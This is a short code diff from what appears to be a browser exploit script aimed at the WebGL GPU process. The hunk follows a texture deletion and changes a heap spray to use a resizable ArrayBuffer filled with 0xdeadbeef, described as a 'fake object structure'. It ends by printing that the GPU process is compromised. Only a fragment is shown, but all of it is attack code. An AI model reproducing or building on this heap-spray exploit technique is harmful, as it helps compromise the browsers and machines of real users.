@@ -76,7 +76,9 @@ gl.deleteTexture(texture);
 }
 
 // Heap spray optimization with fake object structure
-const spray = new ArrayBuffer(102400);
+const spray = new ArrayBuffer(8, { maxByteLength: 1024 * 1024 * 1024 });
+spray.resize(1024 * 1024); 
+
 new Uint32Array(spray).fill(0xdeadbeef);
 
 console.log('[+] Exploit completed - GPU process compromised!');
